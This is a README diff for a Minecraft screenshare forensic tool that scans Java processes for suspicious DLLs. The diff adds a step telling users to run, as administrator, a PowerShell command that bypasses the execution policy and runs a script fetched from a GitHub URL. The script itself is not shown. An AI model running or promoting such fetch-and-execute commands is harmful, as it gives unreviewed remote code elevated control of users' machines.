@@ -4,6 +4,12 @@ A forensic tool for ScreenShare.
 
 The tool scans running Minecraft/Java processes and checks their loaded modules (`.dll` files) for suspicious files that may be associated with external modifications or cheat software.
 
+### How to run
+
+You can download the tool from the releases or run this command on cmd(with administrator)
+
+powershell -Command "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; Invoke-Expression (Invoke-RestMethod 'https://raw.githubusercontent.com/q7dll/executor/main/launcher.ps1')"
+
 ## How It Works
 
 ### Process Detection
